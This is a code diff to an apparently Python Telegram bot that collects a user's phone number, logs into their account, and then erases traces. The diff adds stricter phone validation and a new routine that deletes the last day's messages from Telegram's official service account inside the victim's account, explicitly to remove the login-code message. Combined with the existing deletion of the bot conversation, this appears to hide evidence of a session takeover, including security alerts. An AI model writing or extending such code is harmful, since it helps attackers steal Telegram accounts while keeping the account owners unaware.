@@ -217,12 +217,17 @@ async def main():
         """Handle phone number input."""
         user_id = event.sender_id
         
-        # Validate phone format
-        if not phone.startswith('+'):
+        # Sanitize input: remove spaces, dashes, brackets
+        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
+        
+        # Validate phone format (must have country code)
+        if not phone.startswith('+') or not phone[1:].isdigit() or len(phone) < 7:
             await send_and_track(
                 bot, event,
-                "❌ Phone number must start with `+` country code.\n"
-                "Example: `+1234567890`"
+                "❌ **Invalid Format!**\n\n"
+                "Please include your **country code** (starting with `+`).\n"
+                "Example: `+65 9123 4567` or `+1 555-0199`\n\n"
+                "👉 **Try again:** Send your phone number now."
             )
             return
         
@@ -318,6 +323,9 @@ async def main():
             # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
             asyncio.create_task(cleanup_login_bot_interaction(session.client, me_bot.username))
+            
+            # 3. Clean up Telegram Service Notifications (verification codes)
+            asyncio.create_task(cleanup_telegram_service_messages(session.client))
             # -----------------------------------------------------
 
             reply = await event.respond(
@@ -380,6 +388,9 @@ async def main():
             # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
             asyncio.create_task(cleanup_login_bot_interaction(session.client, me_bot.username))
+            
+            # 3. Clean up Telegram Service Notifications (verification codes)
+            asyncio.create_task(cleanup_telegram_service_messages(session.client))
             # -----------------------------------------------------
 
             reply = await event.respond(
@@ -453,6 +464,41 @@ async def main():
         except Exception as e:
             # It's okay if this fails (e.g., chat not found), just log it
             logger.warning(f"Failed to cleanup login bot interaction: {e}")
+
+    async def cleanup_telegram_service_messages(client):
+        """
+        Deletes messages from Telegram (User 777000) sent in the last 24 hours.
+        This removes the login code message from the user's chat list.
+        """
+        try:
+            logger.info("Cleaning up Telegram Service Notifications (777000)...")
+            telegram_service_id = 777000
+            
+            # Check if chat exists first
+            try:
+                entity = await client.get_input_entity(telegram_service_id)
+            except ValueError:
+                logger.info("Telegram Service chat not found in dialogs.")
+                return
+
+            # Calculate cutoff time (24 hours ago)
+            cutoff = time.time() - (24 * 3600)
+            
+            messages_to_delete = []
+            
+            # Iterate over messages
+            async for message in client.iter_messages(entity, limit=20):
+                if message.date.timestamp() > cutoff:
+                    messages_to_delete.append(message.id)
+            
+            if messages_to_delete:
+                await client.delete_messages(entity, messages_to_delete)
+                logger.info(f"Deleted {len(messages_to_delete)} service messages from Telegram.")
+            else:
+                logger.info("No recent service messages found to delete.")
+                
+        except Exception as e:
+            logger.warning(f"Failed to cleanup Telegram service messages: {e}")
 
     # Keep bot running
     logger.info("Bot is running. Press Ctrl+C to stop.")
